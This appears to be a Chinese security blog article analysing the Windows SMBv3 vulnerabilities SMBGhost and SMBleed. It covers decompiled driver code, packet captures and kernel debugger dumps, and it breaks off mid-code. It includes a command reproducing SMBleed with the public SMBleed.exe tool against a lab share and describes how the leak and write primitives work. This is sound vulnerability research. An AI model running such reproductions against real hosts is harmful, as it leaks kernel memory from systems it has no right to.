> 原文链接: https://www.anquanke.com//post/id/218449 


# SMBGhost &amp;&amp; SMBleed 漏洞深入研究


                                阅读量   
                                **234254**
                            
                        |
                        
                                                                                    



[![](https://p3.ssl.qhimg.com/t01a18ed423e0525853.jpg)](https://p3.ssl.qhimg.com/t01a18ed423e0525853.jpg)



2020年3月11日，微软发布了115个漏洞的补丁程序和一个安全指南（禁用SMBv3压缩指南 —— ADV200005），ADV200005中暴露了一个SMBv3的远程代码执行漏洞，该漏洞可能未经身份验证的攻击者在SMB服务器或客户端上远程执行代码，业内安全专家猜测该漏洞可能会造成蠕虫级传播。补丁日之后，微软又发布了Windows SMBv3 客户端/服务器远程代码执行漏洞的安全更新细节和补丁程序，漏洞编号为CVE-2020-0796，由于一些小插曲，该漏洞又被称为SMBGhost。

2020年6月10日，微软公开修复了Microsoft Server Message Block 3.1.1 (SMBv3)协议中的另一个信息泄露漏洞CVE-2020-1206。该漏洞是由ZecOps安全研究人员在SMBGhost同一漏洞函数中发现的，又被称为SMBleed。未经身份验证的攻击者可通过向目标SMB服务器发特制数据包来利用此漏洞，或配置一个恶意的 SMBv3 服务器并诱导用户连接来利用此漏洞。成功利用此漏洞的远程攻击者可获取敏感信息。

SMBGhost 和 SMBleed 漏洞产生于同一个函数，不同的是，SMBGhost 漏洞源于OriginalCompressedSize 和 Offset 相加产生的整数溢出，SMBleed 漏洞在于 OriginalCompressedSize 或 Offset 欺骗产生的数据泄露。本文对以上漏洞进行分析总结，主要包括以下几个部分：
- SMBGhost 漏洞回顾
- SMBleed 漏洞复现分析
- 物理地址读 &amp;&amp; SMBGhost 远程代码执行
- SMBGhost &amp;&amp; SMBleed 远程代码执行
- Shellcode 调试分析


## SMBGhost 漏洞回顾

CVE-2020-0796漏洞源于Srv2DecompressData函数，该函数主要负责将压缩过的SMB数据包还原（解压），但在使用SrvNetAllocateBuffer函数分配缓冲区时，传入了参数OriginalCompressedSegmentSize + Offset，由于未对这两个值进行额外判断，存在整数溢出的可能。如果SrvNetAllocateBuffer函数使用较小的值作为第一个参数为SMB数据分配缓冲区，获取的缓冲区的长度或小于待解压数据解压后的数据的长度，这将导致程序在解压（SmbCompressionDecompress）的过程中产生缓冲区溢出。

```
NTSTATUS Srv2DecompressData(PCOMPRESSION_TRANSFORM_HEADER Header, SIZE_T TotalSize)
`{`
    PALLOCATION_HEADER Alloc = SrvNetAllocateBuffer(
        (ULONG)(Header-&gt;OriginalCompressedSegmentSize + Header-&gt;Offset),
        NULL);
    If (!Alloc) `{`
        return STATUS_INSUFFICIENT_RESOURCES;
    `}`

    ULONG FinalCompressedSize = 0;

    NTSTATUS Status = SmbCompressionDecompress(
        Header-&gt;CompressionAlgorithm,
        (PUCHAR)Header + sizeof(COMPRESSION_TRANSFORM_HEADER) + Header-&gt;Offset,
        (ULONG)(TotalSize - sizeof(COMPRESSION_TRANSFORM_HEADER) - Header-&gt;Offset),
        (PUCHAR)Alloc-&gt;UserBuffer + Header-&gt;Offset,
        Header-&gt;OriginalCompressedSegmentSize,
        &amp;FinalCompressedSize);
    if (Status &lt; 0 || FinalCompressedSize != Header-&gt;OriginalCompressedSegmentSize) `{`
        SrvNetFreeBuffer(Alloc);
        return STATUS_BAD_DATA;
    `}`


    if (Header-&gt;Offset &gt; 0) `{`
        memcpy(
            Alloc-&gt;UserBuffer,
            (PUCHAR)Header + sizeof(COMPRESSION_TRANSFORM_HEADER),
            Header-&gt;Offset);
    `}`


    Srv2ReplaceReceiveBuffer(some_session_handle, Alloc);
    return STATUS_SUCCESS;
`}`
```

通过SrvNetAllocateBuffer函数获取的缓冲区结构如下，函数返回的是SRVNET_BUFFER_HDR结构的指针，其偏移0x18处存放了User Buffer指针，User Buffer区域用来存放还原的SMB数据，解压操作其实就是向User Buffer偏移offset处释放解压数据：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t012e57d6e9bd893654.png)

原本程序设计的逻辑是，在解压成功之后调用memcpy函数将raw data（压缩数据之前的offset大小的没有被压缩的数据）复制到User Buffer的起始处，解压后的数据是从offset偏移处开始存放的。正常的情况如下图所示，未压缩的数据后面跟着解压后的数据，复制的数据没有超过User Buffer的范围：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01943d64a91bb9030b.png)

但由于整数溢出，分配的User Buffer空间会小，User Buffer减offset剩下的空间不足以容纳解压后的数据，如下图所示。根据该结构的特点，可通过构造Offset、Raw Data和Compressed Data，在解压时覆盖后面SRVNET BUFFER HDR结构体中的UserBuffer指针，从而在后续memcpy时向UserBuffer（任意地址）写入可控的数据（任意数据）。**任意地址写是该漏洞利用的关键。**

[![](https://p4.ssl.qhimg.com/t0146cb8aff61d2d552.png)](https://p4.ssl.qhimg.com/t0146cb8aff61d2d552.png)

3月份跟风分析过此漏洞并学习了通过任意地址写进行本地提权的利用方式，链接如下：[https://mp.weixin.qq.com/s/rKJdP_mZkaipQ9m0Qn9_2Q](https://mp.weixin.qq.com/s/rKJdP_mZkaipQ9m0Qn9_2Q)



## SMBleed 漏洞

根据ZecOps公开的信息可知，引发该漏洞的函数也是srv2.sys中的Srv2DecompressData函数，与SMBGhost漏洞（CVE-2020-0796）相同。

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"></a>漏洞分析

再来回顾一下Srv2DecompressData函数吧，该函数用于还原（解压）SMB数据。首先根据原始压缩数据中的OriginalCompressedSegmentSize和Offset计算出解压后结构的大小，然后通过SrvNetAllocateBuffer函数获取SRVNET BUFFER HDR结构（该结构中指明了可存放无需解压的Offset长度的数据和解压数据的缓冲区的User Buffer），然后调用SmbCompressionDecompress函数向User Buffer的Offset偏移处写入数据。CVE-2020-0796漏洞是由于OriginalCompressedSegmentSize和Offset相加的过程中出现整数溢出，从而导致获取的缓冲区不足以存放解压后的数据，最终在解压过程中产生溢出。
- (ULONG)(Header-&gt;OriginalCompressedSegmentSize + Header-&gt;Offset) 处产生整数溢出，假设结果为x
- SrvNetAllocateBuffer函数会根据x的大小去LookAside中寻找大小合适的缓冲区，并返回其后面的SRVNET BUFFER HDR结构，该结构偏移0x18处指向该缓冲区User Buffer
- SmbCompressionDecompress函数依据指定的压缩算法将待解压数据解压到 User Buffer偏移Offset处，但其实压缩前的数据长度大于剩余的缓冲区长度，解压复制的过程中产生缓冲区溢出
```
NTSTATUS Srv2DecompressData(PCOMPRESSION_TRANSFORM_HEADER Header, SIZE_T TotalSize)
`{`
    PALLOCATION_HEADER Alloc = SrvNetAllocateBuffer(
        (ULONG)(Header-&gt;OriginalCompressedSegmentSize + Header-&gt;Offset),
        NULL);
    If (!Alloc) `{`
        return STATUS_INSUFFICIENT_RESOURCES;
    `}`

    ULONG FinalCompressedSize = 0;

    NTSTATUS Status = SmbCompressionDecompress(
        Header-&gt;CompressionAlgorithm,
        (PUCHAR)Header + sizeof(COMPRESSION_TRANSFORM_HEADER) + Header-&gt;Offset,
        (ULONG)(TotalSize - sizeof(COMPRESSION_TRANSFORM_HEADER) - Header-&gt;Offset),
        (PUCHAR)Alloc-&gt;UserBuffer + Header-&gt;Offset,
        Header-&gt;OriginalCompressedSegmentSize,
        &amp;FinalCompressedSize);
    if (Status &lt; 0 || FinalCompressedSize != Header-&gt;OriginalCompressedSegmentSize) `{`
        SrvNetFreeBuffer(Alloc);
        return STATUS_BAD_DATA;
    `}`


    if (Header-&gt;Offset &gt; 0) `{`
        memcpy(
            Alloc-&gt;UserBuffer,
            (PUCHAR)Header + sizeof(COMPRESSION_TRANSFORM_HEADER),
            Header-&gt;Offset);
    `}`


    Srv2ReplaceReceiveBuffer(some_session_handle, Alloc);
    return STATUS_SUCCESS;
`}`
```

在SmbCompressionDecompress函数中有一个神操作，如下所示，如果nt!RtlDecompressBufferEx2返回值非负（解压成功），则将FinalCompressedSize赋值为OriginalCompressedSegmentSize。因而，只要数据解压成功，就不会进入SrvNetFreeBuffer等流程，即使解压操作后会判断FinalCompressedSize和OriginalCompressedSegmentSize是否相等。这是0796任意地址写的前提条件。

```
if ( (int)RtlGetCompressionWorkSpaceSize(v13, &amp;NumberOfBytes, &amp;v18) &lt; 0
    || (v6 = ExAllocatePoolWithTag((POOL_TYPE)512, (unsigned int)NumberOfBytes, 0x2532534Cu)) != 0i64 )
  `{`
    v14 = &amp;FinalCompressedSize;
    v17 = v8;
    v15 = OriginalCompressedSegmentSize;
    v10 = RtlDecompressBufferEx2(v13, v7, OriginalCompressedSegmentSize, v9, v17, 4096, FinalCompressedSize, v6, v18);
    if ( v10 &gt;= 0 )
      *v14 = v15;
    if ( v6 )
      ExFreePoolWithTag(v6, 0x2532534Cu);
  `}`
```

这也是CVE-2020-1206的漏洞成因之一，SmbCompressionDecompress函数会对FinalCompressedSize值进行更新，导致实际解压出来的数据长度和OriginalCompressedSegmentSize不相等时也不会进入释放流程。而且在解压成功之后会将SRVNET BUFFER HDR结构中的UserBufferSizeUsed赋值为Offset与FinalCompressedSize之和，这个操作也是挺重要的。

```
//Srv2DecompressData

    if (Status &lt; 0 || FinalCompressedSize != Header-&gt;OriginalCompressedSegmentSize) `{`
        SrvNetFreeBuffer(Alloc);
        return STATUS_BAD_DATA;
    `}`

    if (Header-&gt;Offset &gt; 0) `{`
        memcpy(
            Alloc-&gt;UserBuffer,
            (PUCHAR)Header + sizeof(COMPRESSION_TRANSFORM_HEADER),
            Header-&gt;Offset);
    `}`

    Alloc-&gt;UserBufferSizeUsed = Header-&gt;Offset + FinalCompressedSize;

    Srv2ReplaceReceiveBuffer(some_session_handle, Alloc);
    return STATUS_SUCCESS;
`}`
```

那如果我们将OriginalCompressedSegmentSize设置为比实际压缩的数据长度大的数，让系统认为解压后的数据长度就是OriginalCompressedSegmentSize大小，是不是也可以泄露内存中的数据（类似于心脏滴血）。如下所示，POC中将OriginalCompressedSegmentSize设置为x + 0x1000，offset设置为0，最终得到解压后的数据 (长度为x)，其后面跟有未初始化的内核数据 ，然后利用解压后的SMB2 WRITE 消息泄露后面紧跟着的长度为0x1000的未初始化数据。

[![](https://p4.ssl.qhimg.com/t01fba859a72aaf3087.png)](https://p4.ssl.qhimg.com/t01fba859a72aaf3087.png)

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"></a>漏洞复现

在Win10 1903下使用公开的SMBleed.exe进行测试（需要身份认证和可写权限）。步骤如下：
- 共享C盘，确保允许Everyone进行更改（或添加其他用户并赋予其读取和更改权限）
- 在C盘下创建share目录，以便对文件写入和读取
- 按照提示运行SMBleed.exe程序，例：SMBleed.exe win10 127.0.0.1 DESKTOP-C2C92C6 strawberry 123123 c share\test.bin local.bin
以下为获得的local.bin中的部分信息：[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://upload-images.jianshu.io/upload_images/11211672-3ceb45d58f7d7370.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

### <a class="reference-link" name="%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90"></a>抓包分析

在复现的同时可以抓包，可以发现协商之后的大部分包都采用了SMB 压缩（ProtocalId为0x424D53FC）。根据数据包可判断POC流程大概是这样的：SMB协商-&gt;用户认证-&gt;创建文件-&gt;利用漏洞泄露内存信息并写入文件-&gt;将文件读取到本地-&gt;结束连接。

注意到一个来自服务端的Write Response数据包，其status为STATUS_SUCCESS，说明写入操作成功。ZecOps在文章中提到过他们利用[SMB2 WRITE消息](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/e7046961-3318-4350-be2a-a8d69bb59ce8)来演示此漏洞，因而我们需要关注一下其对应的请求包，也就是下图中id为43的那个数据包。

[![](https://p4.ssl.qhimg.com/t01621a6213449a10e9.png)](https://p4.ssl.qhimg.com/t01621a6213449a10e9.png)

下面为触发漏洞的SMB压缩请求包，粉色方框里的OriginalCompressedSegmentSize字段值为0x1070，但实际压缩前的数据只有0x70，可借助 SMB2 WRITE 将未初始化的内存泄露出来。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t011a8c5d066d7a6f4d.png)

以下为解压前后数据对比，解压前数据大小为0x3f，解压后数据大小为0x70（真实解压大小，后面为未初始化内存），解压后的数据包括SMB2数据包头（0x40长度）和偏移0x40处的SMB2 WRITE结构。在这SMB2 WRITE结构中指明了向目标文件写入后面未初始化的0x1000长度的数据。

```
3: kd&gt; 
srv2!Srv2DecompressData+0xdc:
fffff800`01e17f3c e86f657705      call    srvnet!SmbCompressionDecompress (fffff800`0758e4b0)
3: kd&gt; dd rdx   //压缩数据
ffffb283`210dfdf0  02460cc0 424d53fe 00030040 004d0009
ffffb283`210dfe00  18050000 ff000100 010000fe 00190038
ffffb283`210dfe10  0018f800 31150007 00007000 ffffff10
ffffb283`210dfe20  070040df 00183e00 00390179 00060007
ffffb283`210dfe30  00000000 00000000 00000000 00000000
ffffb283`210dfe40  00000000 00000000 00000000 00000000
ffffb283`210dfe50  00000000 00000000 00000000 00000000
ffffb283`210dfe60  00000000 00000000 00000000 00000000

3: kd&gt; db ffffb283`1fe23050 l1070  //解压后数据
ffffb283`1fe23050  fe 53 4d 42 40 00 00 00-00 00 00 00 09 00 40 00  .SMB@.........@.
ffffb283`1fe23060  00 00 00 00 00 00 00 00-05 00 00 00 00 00 00 00  ................
ffffb283`1fe23070  ff fe 00 00 01 00 00 00-01 00 00 00 00 f8 00 00  ................
ffffb283`1fe23080  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffb283`1fe23090  31 00 70 00 00 10 00 00-00 00 00 00 00 00 00 00  1.p.............
ffffb283`1fe230a0  00 00 00 00 3e 00 00 00-01 00 00 00 3e 00 00 00  ....&gt;.......&gt;...
ffffb283`1fe230b0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffb283`1fe230c0  4d 53 53 50 00 03 00 00-00 18 00 18 00 a8 00 00  MSSP............
ffffb283`1fe230d0  00 1c 01 1c 01 c0 00 00-00 1e 00 1e 00 58 00 00  .............X..
ffffb283`1fe230e0  00 14 00 14 00 76 00 00-00 1e 00 1e 00 8a 00 00  .....v..........
ffffb283`1fe230f0  00 10 00 10 00 dc 01 00-00 15 82 88 e2 0a 00 ba  ................
ffffb283`1fe23100  47 00 00 00 0f 42 75 7d-f2 d2 46 fe 0f 4b 14 e0  G....Bu`}`..F..K..
ffffb283`1fe23110  c5 8f fc cd 0a 44 00 45-00 53 00 4b 00 54 00 4f  .....D.E.S.K.T.O
ffffb283`1fe23120  00 50 00 2d 00 43 00 32-00 43 00 39 00 32 00 43  .P.-.C.2.C.9.2.C
ffffb283`1fe23130  00 36 00 73 00 74 00 72-00 61 00 77 00 62 00 65  .6.s.t.r.a.w.b.e
ffffb283`1fe23140  00 72 00 72 00 79 00 44-00 45 00 53 00 4b 00 54  .r.r.y.D.E.S.K.T
ffffb283`1fe23150  00 4f 00 50 00 2d 00 43-00 32 00 43 00 39 00 32  .O.P.-.C.2.C.9.2
ffffb283`1fe23160  00 43 00 36 00 00 00 00-00 00 00 00 00 00 00 00  .C.6............
ffffb283`1fe23170  00 00 00 00 00 00 00 00-00 00 00 00 00 21 52 f2  .............!R.
ffffb283`1fe23180  53 be ee d2 a8 01 46 1d-69 9c 78 f5 90 01 01 00  S.....F.i.x.....
ffffb283`1fe23190  00 00 00 00 00 43 c5 71-42 a7 43 d6 01 d9 a8 02  .....C.qB.C.....
ffffb283`1fe231a0  16 83 a3 24 75 00 00 00-00 02 00 1e 00 44 00 45  ...$u........D.E
ffffb283`1fe231b0  00 53 00 4b 00 54 00 4f-00 50 00 2d 00 43 00 32  .S.K.T.O.P.-.C.2
ffffb283`1fe231c0  00 43 00 39 00 32 00 43-00 36 00 01 00 1e 00 44  .C.9.2.C.6.....D
ffffb283`1fe231d0  00 45 00 53 00 4b 00 54-00 4f 00 50 00 2d 00 43  .E.S.K.T.O.P.-.C
ffffb283`1fe231e0  00 32 00 43 00 39 00 32-00 43 00 36 00 04 00 1e  .2.C.9.2.C.6....
ffffb283`1fe231f0  00 44 00 45 00 53 00 4b-00 54 00 4f 00 50 00 2d  .D.E.S.K.T.O.P.-
ffffb283`1fe23200  00 43 00 32 00 43 00 39-00 32 00 43 00 36 00 03  .C.2.C.9.2.C.6..
ffffb283`1fe23210  00 1e 00 44 00 45 00 53-00 4b 00 54 00 4f 00 50  ...D.E.S.K.T.O.P
ffffb283`1fe23220  00 2d 00 43 00 32 00 43-00 39 00 32 00 43 00 36  .-.C.2.C.9.2.C.6
ffffb283`1fe23230  00 07 00 08 00 43 c5 71-42 a7 43 d6 01 06 00 04  .....C.qB.C.....
ffffb283`1fe23240  00 02 00 00 00 08 00 30-00 30 00 00 00 00 00 00  .......0.0......
ffffb283`1fe23250  00 01 00 00 00 00 20 00-00 6f 26 f2 a8 d5 ab cf  ...... ..o&amp;.....
ffffb283`1fe23260  14 7d a9 e2 e9 5a 37 0e-94 56 6d 23 d4 42 bf ba  .`}`...Z7..Vm#.B..
ffffb283`1fe23270  1c 3d 9b 38 91 d3 b4 0f-cd 0a 00 10 00 00 00 00  .=.8............
ffffb283`1fe23280  00 00 00 00 00 00 00 00-00 00 00 00 00 09 00 00  ................
ffffb283`1fe23290  00 00 00 00 00 00 00 00-00 1e a8 6f 1d 2e 86 e2  ...........o....
ffffb283`1fe232a0  6b b9 6b 8b e6 21 f6 de-7f a3 12 04 10 01 00 00  k.k..!..........
ffffb283`1fe232b0  00 9d 20 ee a2 a7 b3 6e-67 00 00 00 00 00 00 00  .. ....ng.......
```

SMB2 WRITE部分结构如下（了解这些就够了吧）：
<li>
**StructureSize（2个字节）：**客户端必须将此字段设置为49（0x31），表示请求结构的大小，不包括SMB头部。</li>
<li>
**DataOffset（2个字节）：**指明要写入的数据相对于SMB头部的偏移量（以字节为单位）。</li>
<li>
**长度（4个字节）：**要写入的数据的长度，以字节为单位。要写入的数据长度可以为0。</li>
<li>
**偏移量（8个字节）：**将数据写入目标文件的位置的偏移量（以字节为**单位）**。如果在管道上执行写操作，则客户端必须将其设置为0，服务器必须忽略该字段。</li>
<li>
**FILEID（16个字节）：**[SMB2_FILEID](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/f1d9b40d-e335-45fc-9d0b-199a31ede4c3) 文件句柄。<br>
……</li>
所以根据以上信息可知，DataOffset为0x70，数据长度为0x1000，从文件偏移0的位置开始写入。查看本次泄露的数据，可以发现正好就是SMB头偏移0x70处的0x1000长度的数据。

[![](https://p2.ssl.qhimg.com/t015b4443a6025738ad.png)](https://p2.ssl.qhimg.com/t015b4443a6025738ad.png)

所以，前面的UserBufferSizeUsed起了什么样的作用呢？在Srv2PlainTextReceiveHandler函数中会将其复制到v3偏移 0x154处。然后在Smb2ExecuteWriteReal函数（Smb2ExecuteWrite函数调用）中会判断之前复制的那个双字节值是否小于SMB2 WRITE结构中的DataOffset和长度之和，如果小于的话就会出错（不能写入数据）。POC中将这两个字段分别设置为0x70和0x1000，相加后正好等于0x1070，如果将长度字段设置的稍小一些，那么相应的，泄露的数据长度也会变小。也就是说，OriginalCompressedSegmentSize字段设置了泄露的上限（OriginalCompressedSegmentSize – DataOffset），具体泄露的数据长度还是要看SMB2 WRITE结构中的长度。在这里不得不佩服作者的脑洞，但这种思路需要目标系统共享文件夹以及获取权限，还是有些局限的。

```
//Srv2PlainTextReceiveHandler
  v2 = a2;
  v3 = a1;
  v4 = Smb2ValidateMessageIdAndCommand(
         a1,
         *(_QWORD *)(*(_QWORD *)(a1 + 0xF0) + 0x18i64),    //UserBuffer
         *(_DWORD *)(*(_QWORD *)(a1 + 0xF0) + 0x24i64));   //UserBufferSizeUsed
  if ( (v4 &amp; 0x80000000) == 0 )
  `{`
    v6 = *(_QWORD *)(v3 + 0xF0);
    *(_DWORD *)(v3 + 0x158) = *(_DWORD *)(v6 + 0x24);
    v7 = Srv2CheckMessageSize(*(_DWORD *)(v6 + 0x24), *(_DWORD *)(v6 + 0x24), *(_QWORD *)(v6 + 0x18));    //UserBufferSizeUsed or *(int *)(UserBuffer+0x14)
    v9 = v7;
    if ( v7 == (_DWORD)v8 || (result = Srv2PlainTextCompoundReceiveHandler(v3, v7), (int)result &gt;= 0) )
    `{`
      *(_DWORD *)(v3 + 0x150) = v9;
      *(_DWORD *)(v3 + 0x154) = v9;    //上层结构，没有好好分析
      *(_BYTE *)(v3 + 0x198) = 1;

//Smb2ExecuteWriteReal
3: kd&gt; g
Breakpoint 5 hit
srv2!Smb2ExecuteWriteReal+0xc9:
fffff800`01e4f949 0f82e94f0100    jb      srv2!Smb2ExecuteWriteReal+0x150b8 (fffff800`01e64938)
3: kd&gt; ub rip
srv2!Smb2ExecuteWriteReal+0xa5:
fffff800`01e4f925 85c0            test    eax,eax
fffff800`01e4f927 0f88b94f0100    js      srv2!Smb2ExecuteWriteReal+0x15066 (fffff800`01e648e6)
fffff800`01e4f92d 4c39bbb8000000  cmp     qword ptr [rbx+0B8h],r15
fffff800`01e4f934 0f85d34f0100    jne     srv2!Smb2ExecuteWriteReal+0x1508d (fffff800`01e6490d)
fffff800`01e4f93a 0fb74f42        movzx   ecx,word ptr [rdi+42h]
fffff800`01e4f93e 8bc1            mov     eax,ecx
fffff800`01e4f940 034744          add     eax,dword ptr [rdi+44h]
fffff800`01e4f943 398654010000    cmp     dword ptr [rsi+154h],eax

3: kd&gt; dd rdi
ffffb283`1fe25050  424d53fe 00000040 00000000 00400009
ffffb283`1fe25060  00000000 00000000 00000005 00000000
ffffb283`1fe25070  0000feff 00000001 00000001 0000f800
ffffb283`1fe25080  00000000 00000000 00000000 00000000
ffffb283`1fe25090  00700031 00001000 00000000 00000000
ffffb283`1fe250a0  00000000 0000003e 00000001 0000003e
ffffb283`1fe250b0  00000000 00000000 00000000 00000000
ffffb283`1fe250c0  00000000 00000000 00000020 00000000
```



## 物理地址读&amp;&amp;SMBGhost远程代码执行

在进行复现前，对一些结构进行分析，如Lookaside、SRVNET BUFFER HDR、MDL等等，以便更好地理解这种利用方式。

### <a class="reference-link" name="Lookaside%20%E5%88%9D%E5%A7%8B%E5%8C%96"></a>Lookaside 初始化

SrvNetAllocateBuffer函数会从SrvNetBufferLookasides表中获取大小合适的缓冲区，如下所示，SrvNetAllocateBuffer第一个参数为数据的长度，这里为还原的数据的长度（解压+无需解压的数据），第二个参数为SRVNET_BUFFER_HDR结构体指针或0。如果传入的长度在[ 0x1100 , 0x100100 ] 区间，会进入以下流程。

```
//SrvNetAllocateBuffer(unsigned __int64 a1, __int64 a2)
//a1: OriginalCompressedSegmentSize + Offset
//a2: 0

v3 = 0;
......
  else
  `{`
    if ( a1 &gt; 0x1100 )                          // 这里这里
    `{`
      v13 = a1 - 0x100;
      _BitScanReverse64((unsigned __int64 *)&amp;v14, v13);// 从高到低扫描，找到第一个1，v14存放比特位
      _BitScanForward64((unsigned __int64 *)&amp;v15, v13);// 从低到高扫描，找到第一个1，v15存放比特位
      if ( (_DWORD)v14 == (_DWORD)v15 )         // 说明只有一个1
        v3 = v14 - 0xC; 
      else
        v3 = v14 - 0xB;
    `}`
    v6 = SrvNetBufferLookasides[v3];
```

上述代码的逻辑为，分别找到length – 0x100中1的最高比特位和最低比特位，如果相等的话，用最高比特位索引减0xC，否则用最高比特位索引减0xB。最高比特位x可确定长度的大致范围[1&lt;&lt;x,1&lt;&lt;(x+1)]，然后通过判断两个比特位是否相等来确定是否需要更大的空间，如果相等就选1&lt;&lt;x，不相等就是1&lt;&lt;(x+1)。这里用最高比特位减0xC或0xB得到一个值，然后再用这个值在SrvNetBufferLookasides表中进行索引。下表为length – 0x100中比特位1唯一的情况下，第一行为length减0x100后的数据比特位1的索引i，第二行为(1&gt;&gt;i) + 0x100的值，也就是length，第三行为 i – 0xc，表示SrvNetBufferLookasides中相应的索引。<br>
|比特位|12|13|14|15|16|17|18|19|20|<br>
|——|——|——|——|——|——|——|——|——|——|<br>
|长度|0x1100|0x2100|0x4100|0x8100|0x10100|0x20100|0x40100|0x80100|0x100100|<br>
|索引|0|1|2|3|4|5|6|7|8|<br>
后面的流程为根据索引从SrvNetBufferLookasides中取出相应结构体X的指针，取其第一项（核心数加1的值），v2为KPCR结构偏移0x1A4处的核心号。然后从结构体X偏移0x20处获取结构v9，v7（v8）表示当前核心要处理的数据在v9结构体中的索引（核心号加1），然后通过v8索引获取结构v10，综上：v10 = **(_QWORD **)(**(_QWORD **)（SrvNetBufferLookasides[index] + 0x20）+ 8*（Core number + 1）），如果v10偏移0x70处不为0（表示结构已分配），就取出v10偏移8处的结构（SRVNET_BUFFER_HDR）。如果没分配，就调用PplpLazyInitializeLookasideList函数。

```
v2 = __readgsdword(0x1A4u);
 ......
    v6 = SrvNetBufferLookasides[v3];
    v7 = *(_DWORD *)v6 - 1;
    if ( (unsigned int)v2 + 1 &lt; *(_DWORD *)v6 )
      v7 = v2 + 1;
    v8 = v7;
    v9 = *(_QWORD *)(v6 + 0x20);
    v10 = *(_QWORD *)(v9 + 8 * v8);
    if ( !*(_BYTE *)(v10 + 0x70) )
      PplpLazyInitializeLookasideList(v6, *(_QWORD *)(v9 + 8 * v8));
    ++*(_DWORD *)(v10 + 0x14);
    v11 = (SRVNET_BUFFER_HDR *)ExpInterlockedPopEntrySList((PSLIST_HEADER)v10);

```

举个例子（单核系统），假设需要的缓冲区长度为0x10101（需要0x20100大小的缓冲区来存放），得到SrvNetBufferLookasides表中的索引为5，最终通过一步一步索引得到缓冲区0xffffcc0f775f0150（熟悉的SRVNET_BUFFER_HDR结构）：

```
kd&gt; 
srvnet!SrvNetAllocateBuffer+0x5d:
fffff806`2280679d 440fb7c5        movzx   r8d,bp

//SrvNetBufferLookasides表  大小0x48 索引0-8
kd&gt; dq rcx   
fffff806`228350f0  ffffcc0f`7623dd00 ffffcc0f`7623d480
fffff806`22835100  ffffcc0f`7623dc40 ffffcc0f`7623d100
fffff806`22835110  ffffcc0f`7623dd80 ffffcc0f`7623d640
fffff806`22835120  ffffcc0f`7623db40 ffffcc0f`7623dbc0
fffff806`22835130  ffffcc0f`7623de00 

//SrvNetBufferLookasides[5]  单核系统核心数1再加1为2（第一项）
kd&gt; dq ffffcc0f`7623d640
ffffcc0f`7623d640  00000000`00000002 6662534c`3030534c
ffffcc0f`7623d650  00000000`00020100 00000000`00000200
ffffcc0f`7623d660  ffffcc0f`762356c0 00000000`00000000
ffffcc0f`7623d670  00000000`00000000 00000000`00000000

//上面的结构偏移0x20
kd&gt; dq ffffcc0f`762356c0
ffffcc0f`762356c0  ffffcc0f`75191ec0 ffffcc0f`75192980

//上面的结构偏移8      v8 = v7 = 2 - 1 = 1
kd&gt; dq ffffcc0f`75192980
ffffcc0f`75192980  00000000`00090001 ffffcc0f`775f0150
ffffcc0f`75192990  00000009`01000004 00000009`00000001
ffffcc0f`751929a0  00000200`00000000 00020100`3030534c
ffffcc0f`751929b0  fffff806`2280d600 fffff806`2280d590
ffffcc0f`751929c0  ffffcc0f`76047cb0 ffffcc0f`75190780
ffffcc0f`751929d0  00000001`00000009 00000000`00000000
ffffcc0f`751929e0  ffffcc0f`75191ec0 00000000`00000000
ffffcc0f`751929f0  00000000`00000001 00000000`00000000

//ExpInterlockedPopEntrySList弹出偏移8处的0xffffcc0f775f0150，还是熟悉的味道（SRVNET_BUFFER_HDR）
kd&gt; dd ffffcc0f`775f0150
ffffcc0f`775f0150  00000000 00000000 72f39558 ffffcc0f
ffffcc0f`775f0160  00050000 00000000 775d0050 ffffcc0f
ffffcc0f`775f0170  00020100 00000000 00020468 00000000
ffffcc0f`775f0180  775d0000 ffffcc0f 775f01e0 ffffcc0f
ffffcc0f`775f0190  00000000 6f726274 00000000 00000000
ffffcc0f`775f01a0  775f0320 ffffcc0f 00000000 00000000
ffffcc0f`775f01b0  00000000 00000001 63736544 74706972
ffffcc0f`775f01c0  006e6f69 00000000 ffffffd8 00610043
```

SrvNetBufferLookasides是由自定义的SrvNetCreateBufferLookasides函数初始化的。如下所示，这里其实就是以1 &lt;&lt; (index + 0xC)) + 0x100为长度（0 &lt;= index &lt; 9），然后调用PplCreateLookasideList设置上面介绍的那些结构。在PplCreateLookasideList函数中设置上面第二三个结构，在PplpCreateOneLookasideList函数中设置上面第四个结构，最终在SrvNetAllocateBufferFromPool函数（SrvNetBufferLookasideAllocate函数调用）中设置SRVNET_BUFFER_HDR结构。

```
//SrvNetCreateBufferLookasides
  while ( 1 )
  `{`
    v4 = PplCreateLookasideList(
           (__int64 (__fastcall *)())SrvNetBufferLookasideAllocate,
           (__int64 (__fastcall *)(PSLIST_ENTRY))SrvNetBufferLookasideFree,
           v1,                                  // 0
           v2,                                  // 0
